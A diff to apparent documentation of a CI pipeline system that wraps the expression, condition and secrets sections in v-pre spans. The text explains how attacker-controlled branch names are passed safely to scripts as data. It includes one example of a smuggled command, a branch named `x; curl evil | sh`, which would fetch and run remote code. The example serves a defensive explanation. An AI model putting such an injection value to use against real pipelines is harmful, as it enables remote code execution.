@@ -255,7 +255,7 @@ Templates are expanded when the file is parsed. A template cannot use another te
 
 ### Expressions in scripts
 
-In a `run` (or `test` `command`) script, `${{ branch }}`, `${{ ref }}`, `${{ tag }}`, `${{ actor }}`, `${{ inputs.* }}` and `${{ needs.*.outputs.* }}` are not pasted into the script text, because a branch name or PR author is attacker-controlled. Each is passed to the shell as an environment variable and the script sees a `${PIPELINE_EXPR_*}` reference instead, so a branch named `x; curl evil | sh` is only ever data. `${{ matrix.* }}`, `${{ env.* }}`, `${{ secrets.* }}`, `${{ sha }}`, `${{ app }}`, `${{ job }}`, `${{ run.* }}` and `${{ pipeline }}` come from the pipeline file or validated identifiers and are still substituted directly. Inside single quotes the reference is not expanded, so write `"${{ branch }}"` rather than `'${{ branch }}'`, and quote it when it may contain spaces.
+<span v-pre>In a `run` (or `test` `command`) script, `${{ branch }}`, `${{ ref }}`, `${{ tag }}`, `${{ actor }}`, `${{ inputs.* }}` and `${{ needs.*.outputs.* }}` are not pasted into the script text, because a branch name or PR author is attacker-controlled. Each is passed to the shell as an environment variable and the script sees a `${PIPELINE_EXPR_*}` reference instead, so a branch named `x; curl evil | sh` is only ever data. `${{ matrix.* }}`, `${{ env.* }}`, `${{ secrets.* }}`, `${{ sha }}`, `${{ app }}`, `${{ job }}`, `${{ run.* }}` and `${{ pipeline }}` come from the pipeline file or validated identifiers and are still substituted directly. Inside single quotes the reference is not expanded, so write `"${{ branch }}"` rather than `'${{ branch }}'`, and quote it when it may contain spaces.</span>
 
 ### Artifacts and caches
 
@@ -286,7 +286,7 @@ A matrix job becomes one job per combination (named like `test[go=1.23,os=alpine
 
 ## Conditions and expressions
 
-`if` accepts `==`, `!=`, `&&`, `||`, `!`, parentheses, string literals in single quotes, and the functions `success()`, `failure()`, `cancelled()`, `always()`, `contains()`, `startsWith()`, and `endsWith()`. The same values are available inside `${{ }}` anywhere in a step's `run`, `env`, or `with`.
+`if` accepts `==`, `!=`, `&&`, `||`, `!`, parentheses, string literals in single quotes, and the functions `success()`, `failure()`, `cancelled()`, `always()`, `contains()`, `startsWith()`, and `endsWith()`. The same values are available inside <span v-pre>`${{ }}`</span> anywhere in a step's `run`, `env`, or `with`.
 
 | Value | Meaning |
 | --- | --- |
@@ -308,7 +308,7 @@ A step can publish an output by printing a line of the form `::set-output name=k
 
 ## Secrets
 
-Secrets come from the app's existing secrets (`PUT /api/v1/apps/{name}/secrets/{key}`, or **Environment** in the dashboard). Use `${{ secrets.NAME }}` in a step, or list names under a step's `secrets:` to export them as environment variables. Values are sent to the container through standard input, not command arguments, and are masked (`***`) in stored logs. A missing secret fails the step before it runs.
+Secrets come from the app's existing secrets (`PUT /api/v1/apps/{name}/secrets/{key}`, or **Environment** in the dashboard). Use <span v-pre>`${{ secrets.NAME }}`</span> in a step, or list names under a step's `secrets:` to export them as environment variables. Values are sent to the container through standard input, not command arguments, and are masked (`***`) in stored logs. A missing secret fails the step before it runs.
 
 Pipeline steps can read every secret of their own app, so treat write access to a pipeline as write access to those secrets.
 
